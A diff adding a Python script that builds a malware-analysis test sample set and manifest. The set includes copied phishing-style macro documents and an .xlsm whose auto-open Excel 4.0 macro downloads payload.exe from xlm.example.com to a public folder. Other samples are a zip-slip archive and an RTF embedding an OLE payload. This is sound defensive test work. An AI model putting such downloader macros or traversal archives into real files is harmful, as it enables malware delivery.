@@ -1,0 +1,342 @@
+#!/usr/bin/env python3
+"""Gathers the local sample set for PLAN.md step 0.8 and writes samples/manifest.json.
+
+Copies test fixtures from ace3's checkout into samples/ace3/, which is in git, and makes
+benign samples that ace3's repository doesn't hold as files into samples/local/, which
+.gitignore keeps out of git. The local ones follow the fixtures ace3's tests build in
+code, so both systems see the same shapes.
+
+Every sample records where it came from, its sha256, the kinds of file it covers, and the
+unit it is scanned as: its path inside an alert and the yara_meta tags it would carry.
+An email is the alert's root file, named email.rfc822 the way the journal collector names
+it, with no tags. Anything else arrives as an email attachment: ace3 names an attachment
+after itself at the alert's top level and tags it type=email.attachment
+(ace3/saq/modules/email/rfc822.py).
+
+Usage: tools/samples/gather [--ace3 PATH]
+PATH defaults to ../ace3 beside this checkout. Needs 7z on PATH for the encrypted archives.
+Encrypted archives get a random salt, so their sha256 changes on every run; rerun this
+script rather than editing the manifest by hand.
+"""
+
+import argparse
+import email.message
+import hashlib
+import json
+import os
+import shutil
+import struct
+import subprocess
+import sys
+import tempfile
+import zipfile
+from pathlib import Path
+
+REPO = Path(__file__).resolve().parent.parent.parent
+SAMPLES = REPO / "samples"
+
+# Each kind PLAN.md 0.8 asks the set to cover.
+REQUIRED_KINDS = [
+    "email",
+    "archive/zip",
+    "archive/7z",
+    "archive/rar",
+    "archive/password",
+    "pdf",
+    "office/macro",
+    "rtf",
+]
+
+EMAIL_TEST = "tests/saq/modules/test_email/emails"
+FILE_TEST = "tests/saq/modules/test_file_analysis"
+FULL_TEST = "tests/saq/modules/test_file_analysis_full"
+
+# (path in ace3, directory under samples/ace3, kinds, note)
+ACE3_FIXTURES = [
+    *[
+        (f"{EMAIL_TEST}/{name}", "email", ["email"], None)
+        for name in [
+            "direct_send_spoof.email.rfc822",
+            "encoded_subject.email.rfc822",
+            "encrypted_msoffice.email.rfc822",
+            "extra_message_id.email.rfc822",
+            "multi_recipient_to_cc.email.rfc822",
+            "multi_rfc2047_filename.email.rfc822",
+            "nested_rfc822_bom.email.rfc822",
+            "nested_rfc822_pdf.email.rfc822",
+            "o365_journaled.email.rfc822",
+            "o365_journaled_7bit_bom_meta.email.rfc822",
+            "o365_journaled_expanded_rcpt.email.rfc822",
+            "o365_journaled_multi_rcpt.email.rfc822",
+            "o365_journaled_qp_meta.email.rfc822",
+            "pdf_attachment.email.rfc822",
+            "smtp.email.rfc822",
+            "splunk_logging.email.rfc822",
+        ]
+    ],
+    (f"{FILE_TEST}/sample_rfc822.in", "email", ["email"], None),
+    (f"{FILE_TEST}/evil.zip", "archive", ["archive/zip"], None),
+    (f"{FILE_TEST}/zipped.zip", "archive", ["archive/zip"], None),
+    (f"{FULL_TEST}/zip/test.zip", "archive", ["archive/zip"], None),
+    (f"{FILE_TEST}/zipped.jar", "archive", ["archive/zip", "archive/jar"], None),
+    (f"{FULL_TEST}/jar/test.jar", "archive", ["archive/zip", "archive/jar"], None),
+    (f"{FULL_TEST}/jar/malicious.jar", "archive", ["archive/zip", "archive/jar"], None),
+    (f"{FULL_TEST}/jar/too_many_files.jar", "archive", ["archive/zip", "archive/jar"], None),
+    (f"{FULL_TEST}/7z/over.7z", "archive", ["archive/7z"], None),
+    (f"{FULL_TEST}/7z/under.7z", "archive", ["archive/7z"], None),
+    (f"{FULL_TEST}/rar/test.r07", "archive", ["archive/rar"], "RAR5, one member, not encrypted"),
+    (f"{FULL_TEST}/ace/dhl_report.ace", "archive", ["archive/ace"], "WinACE, which ace3 extracts with unace"),
+    (f"{FILE_TEST}/sample_pdf_with_qr_code.pdf", "pdf", ["pdf"], None),
+    (f"{FULL_TEST}/pdf/ComplaintApril_424256637.pdf", "pdf", ["pdf"], None),
+    (f"{FULL_TEST}/pdf/Payment_Advice.pdf", "pdf", ["pdf"], None),
+    ("tests/saq/test_mime_extractor/718148a5712c1fec7b50acc89eee2aa0", "pdf", ["pdf"], None),
+    (f"{FULL_TEST}/doc/DOC_PO_10142020EX.doc", "office", ["office/macro", "office/ole"], "VBA"),
+    (f"{FULL_TEST}/ole_files/Outstanding Invoices.doc", "office", ["office/macro", "office/ole"], "VBA"),
+    (f"{FULL_TEST}/ole_files/Paid Invoice.doc", "office", ["office/macro", "office/ole"], "VBA"),
+    (f"{FULL_TEST}/ole_files/Past Due Invoices.doc", "office", ["office/macro", "office/ole"], "VBA"),
+    (f"{FULL_TEST}/ole_files/receipt_687790.doc", "office", ["office/macro", "office/ole"], "VBA"),
+    (
+        f"{FULL_TEST}/ole_files/word2013_macro_stripped.doc",
+        "office",
+        ["office/macro", "office/ole"],
+        "VBA project with its source stripped, so only the p-code is left",
+    ),
+    (
+        f"{FULL_TEST}/ole_files/mortgage_payment-0873821-0565.docm",
+        "office",
+        ["office/macro", "office/ooxml"],
+        "VBA in word/vbaProject.bin",
+    ),
+    (f"{FULL_TEST}/openoffice/demo.odt", "office", ["office/macro", "office/odf"], "OpenOffice Basic"),
+    (f"{FILE_TEST}/doc.doc", "office", ["office/ole"], "no macros"),
+    (f"{FILE_TEST}/doc.docx", "office", ["office/ooxml"], "no macros"),
+    (f"{FULL_TEST}/docx/js_ole_obj.docx", "office", ["office/ooxml"], "embedded OLE objects, no macros"),
+]
+
+BENIGN_TEXT = b"ace4 sample set: a benign text file.\n"
+# A fixed timestamp, so zips without encryption come out the same on every run.
+FIXED_TIME = (2026, 10, 29, 0, 0, 0)
+FIXED_EPOCH = 1793232000  # 2026-10-29T00:00:00Z
+
+
+def run(*command, cwd=None):
+    subprocess.run(command, cwd=cwd, check=True, capture_output=True)
+
+
+def write_zip(path, members):
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
+        for name, data in members.items():
+            info = zipfile.ZipInfo(name, date_time=FIXED_TIME)
+            info.compress_type = zipfile.ZIP_DEFLATED
+            archive.writestr(info, data)
+
+
+def seven_zip(path, work, *flags):
+    """Archives work/readme.txt into path with 7z and the given flags."""
+    payload = work / "readme.txt"
+    payload.write_bytes(BENIGN_TEXT)
+    os.utime(payload, (FIXED_EPOCH, FIXED_EPOCH))
+    run("7z", "a", *flags, str(path), payload.name, cwd=work)
+
+
+def ole1_package(filename, payload):
+    """An embedded OLE1 Package object, built as ace3/tests/saq/modules/file_analysis/test_rtf.py does."""
+    source = b"C:\\tmp\\" + filename
+    native = struct.pack("<H", 2) + filename + b"\x00" + source + b"\x00" + struct.pack("<II", 0, 0)
+    native += source + b"\x00" + struct.pack("<I", len(payload)) + payload
+    class_name = b"Package\x00"
+    header = (
+        struct.pack("<II", 0x00000501, 2)
+        + struct.pack("<I", len(class_name))
+        + class_name
+        + struct.pack("<II", 0, 0)
+    )
+    return header + struct.pack("<I", len(native)) + native
+
+
+# The XLM workbook from ace3/tests/saq/modules/file_analysis/test_xlm.py: an auto-open
+# Excel 4.0 macro that would download from an example.com URL.
+XLSM_PARTS = {
+    "[Content_Types].xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+<Default Extension="xml" ContentType="application/xml"/>
+<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
+<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>
+</Types>""",
+    "_rels/.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>""",
+    "xl/workbook.xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+<sheets><sheet name="Macro1" sheetId="1" r:id="rId1"/></sheets>
+<definedNames><definedName name="_xlnm.Auto_Open">Macro1!$A$1</definedName></definedNames>
+</workbook>""",
+    "xl/_rels/workbook.xml.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+<Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/>
+</Relationships>""",
+    "xl/macrosheets/sheet1.xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main">
+<sheetData>
+<row r="1"><c r="A1"><f>CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://xlm.example.com/payload.exe","c:\\users\\public\\p.exe",0,0)</f></c></row>
+<row r="2"><c r="A2"><f>HALT()</f></c></row>
+</sheetData>
+</xm:macrosheet>""",
+}
+
+
+def make_local(local, work):
+    """Makes the local samples and returns (path, kinds, how it was made) for each."""
+    made = []
+
+    def add(relative, kinds, how):
+        made.append((local / relative, kinds, how))
+
+    archive = local / "archive"
+    archive.mkdir(parents=True)
+
+    seven_zip(archive / "password-infected.zip", work, "-tzip", "-pinfected", "-mem=ZipCrypto")
+    add("archive/password-infected.zip", ["archive/zip", "archive/password"],
+        "7z, ZipCrypto, password infected, one text member")
+    seven_zip(archive / "password-infected-aes256.zip", work, "-tzip", "-pinfected", "-mem=AES256")
+    add("archive/password-infected-aes256.zip", ["archive/zip", "archive/password"],
+        "7z, AES-256, password infected, one text member")
+    seven_zip(archive / "password-infected.7z", work, "-t7z", "-pinfected")
+    add("archive/password-infected.7z", ["archive/7z", "archive/password"],
+        "7z, password infected, member names visible")
+    seven_zip(archive / "password-infected-headers.7z", work, "-t7z", "-pinfected", "-mhe=on")
+    add("archive/password-infected-headers.7z", ["archive/7z", "archive/password"],
+        "7z, password infected, member names encrypted too")
+
+    inner = work / "inner.zip"
+    write_zip(inner, {"readme.txt": BENIGN_TEXT})
+    write_zip(archive / "nested.zip", {"inner.zip": inner.read_bytes()})
+    add("archive/nested.zip", ["archive/zip", "archive/nested"],
+        "Python zipfile, a zip inside a zip holding one text file")
+    write_zip(archive / "zip-slip.zip", {"../x": BENIGN_TEXT, "readme.txt": BENIGN_TEXT})
+    add("archive/zip-slip.zip", ["archive/zip", "archive/path-traversal"],
+        "Python zipfile, a member named ../x beside a normal one")
+
+    # An email whose zip attachment is encrypted with a password given in the body, as
+    # ace3/tests/saq/modules/email/test_encryption.py builds it.
+    mail = local / "email"
+    mail.mkdir(parents=True)
+    password = "Secr3tPw"
+    payload = work / "invoice.txt"
+    payload.write_text("the decrypted payload https://payload.example.com/x\n")
+    os.utime(payload, (FIXED_EPOCH, FIXED_EPOCH))
+    run("7z", "a", "-tzip", f"-p{password}", "invoice.zip", payload.name, cwd=work)
+    message = email.message.EmailMessage()
+    message["From"] = "sender@example.com"
+    message["To"] = "recipient@example.com"
+    message["Subject"] = "invoice"
+    message["Message-ID"] = "<encrypted-zip-sample@example.com>"
+    message.set_content(f"The password for the attached invoice is {password} thanks")
+    message.add_attachment(
+        (work / "invoice.zip").read_bytes(), maintype="application", subtype="zip", filename="invoice.zip"
+    )
+    message.set_boundary("ace4-sample-boundary")
+    (mail / "encrypted_zip_password_in_body.email.rfc822").write_bytes(bytes(message))
+    add("email/encrypted_zip_password_in_body.email.rfc822", ["email", "archive/password"],
+        "Python email, a zip encrypted with the password Secr3tPw, which the body gives")
+
+    office = local / "office"
+    office.mkdir(parents=True)
+    write_zip(office / "invoice.xlsm", XLSM_PARTS)
+    add("office/invoice.xlsm", ["office/macro", "office/ooxml"],
+        "Python zipfile, an Excel 4.0 (XLM) auto-open macro sheet")
+
+    rtf = local / "rtf"
+    rtf.mkdir(parents=True)
+    data = ole1_package(b"payload.exe", b"MZ" + b"\x90" * 64).hex().encode()
+    (rtf / "document.rtf").write_bytes(
+        b"{\\rtf1\\ansi Hello \\par\r\n{\\object\\objemb{\\*\\objclass Package}{\\*\\objdata "
+        + data
+        + b"}}}"
+    )
+    add("rtf/document.rtf", ["rtf", "rtf/ole-object"],
+        "an OLE1 Package object holding payload.exe, which is MZ and 64 NOPs")
+    (rtf / "plain.rtf").write_bytes(b"{\\rtf1\\ansi\\deff0 {\\fonttbl {\\f0 Arial;}} Hello from ace4.\\par}")
+    add("rtf/plain.rtf", ["rtf"], "text only, no objects")
+    return made
+
+
+def entry(path, kinds, source, note=None):
+    data = path.read_bytes()
+    relative = path.relative_to(SAMPLES).as_posix()
+    is_email = "email" in kinds
+    record = {
+        "path": relative,
+        "sha256": hashlib.sha256(data).hexdigest(),
+        "size": len(data),
+        "kinds": kinds,
+        "source": source,
+        "in_git": relative.startswith("ace3/"),
+        "alert_path": "email.rfc822" if is_email else path.name,
+        "meta_tags": [] if is_email else ["type=email.attachment"],
+    }
+    if note:
+        record["note"] = note
+    return record
+
+
+def main():
+    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
+    parser.add_argument("--ace3", type=Path, default=REPO.parent / "ace3")
+    args = parser.parse_args()
+    ace3 = args.ace3.resolve()
+    commit = subprocess.run(
+        ["git", "-C", str(ace3), "rev-parse", "--short=8", "HEAD"],
+        check=True, capture_output=True, text=True,
+    ).stdout.strip()
+
+    samples = []
+    shutil.rmtree(SAMPLES / "ace3", ignore_errors=True)
+    for relative, directory, kinds, note in ACE3_FIXTURES:
+        source = ace3 / relative
+        target = SAMPLES / "ace3" / directory / source.name
+        target.parent.mkdir(parents=True, exist_ok=True)
+        shutil.copyfile(source, target)
+        samples.append(entry(target, kinds, f"ace3 {commit}: {relative}", note))
+
+    shutil.rmtree(SAMPLES / "local", ignore_errors=True)
+    with tempfile.TemporaryDirectory() as work:
+        for path, kinds, how in make_local(SAMPLES / "local", Path(work)):
+            samples.append(entry(path, kinds, f"made by tools/samples/gather: {how}"))
+
+    covered = {kind for sample in samples for kind in sample["kinds"]}
+    missing = [kind for kind in REQUIRED_KINDS if kind not in covered]
+    manifest = {
+        "about": (
+            "The local sample set from PLAN.md step 0.8, written by tools/samples/gather. "
+            "alert_path and meta_tags give the unit each file is scanned as: an email is "
+            "the alert's root file email.rfc822 with no tags, and anything else is an "
+            "email attachment at the alert's top level tagged type=email.attachment. "
+            "Files under local/ aren't in git; rerun the script to make them."
+        ),
+        "ace3_commit": commit,
+        "required_kinds": REQUIRED_KINDS,
+        "gaps": [
+            "an encrypted RAR: making one needs RARLAB's non-free rar tool",
+            "a legacy .xls (BIFF8) with an Excel 4.0 macro sheet: nothing here writes one",
+            "PowerPoint and Excel files with VBA macros: ace3's tests hold Word ones only",
+            "an encrypted PDF: ace3's tests build theirs with pikepdf at test time",
+        ],
+        "samples": sorted(samples, key=lambda sample: sample["path"]),
+    }
+    (SAMPLES / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n")
+
+    for kind in REQUIRED_KINDS:
+        count = sum(kind in sample["kinds"] for sample in samples)
+        print(f"{kind:18} {count:3} samples")
+    if missing:
+        print(f"missing kinds: {', '.join(missing)}", file=sys.stderr)
+        return 1
+    print(f"wrote {len(samples)} samples to samples/manifest.json")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
